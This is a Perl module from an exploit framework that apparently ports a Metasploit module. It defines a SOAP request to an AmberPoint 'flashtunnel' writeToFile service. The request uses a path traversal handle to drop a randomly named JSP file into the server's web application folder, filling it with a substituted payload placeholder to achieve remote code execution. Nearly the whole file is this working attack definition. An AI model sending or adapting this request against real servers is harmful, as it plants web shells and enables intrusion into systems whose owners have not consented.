MSFExploits/soa/MSF/flash_svc.pm

package MSFExploits::soa::MSF::flash_svc;
# # # use parent qw(MSFExploits::Exploit MSFExploits::Services::soa);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # # use MSFExploits::Functions::Basic;
# # # use MSFExploits::Functions::Errors;
# # # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "flash_svc";

   my $DETECTION = {

   };

   my $EXPLOIT = {
  TYPE => 'MSF',
  PLATFORM => 'btmui',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => '',
      PAYLOAD      => '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:int="http://schemas.amberpoint.com/flashtunnel/interfaces" xmlns:typ="http://schemas.amberpoint.com/flashtunnel/types">	<soapenv:Header/>	<soapenv:Body>		<int:writeToFileRequest>			<int:writeToFile handle="..\..\..\..\..\..\..\..\..\..\\server\examples\build\mainWebApp\lRxGUvmru.jsp">				<typ:text>&#x5f;&#x5f;&#x50;&#x41;&#x59;&#x4c;&#x4f;&#x41;&#x44;&#x5f;&#x5f;</typ:text>				<typ:WriteToFileRequestVersion>				</typ:WriteToFileRequestVersion>			</int:writeToFile>		</int:writeToFileRequest>	</soapenv:Body></soapenv:Envelope>',
      TEXT   => 'Sending Exploit #1 Request : [POST] /',
      HEADERS      => {
   'Content-Type' => 'text/xml;charset=UTF-8',
      },
      VALIDATION   => {
   TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
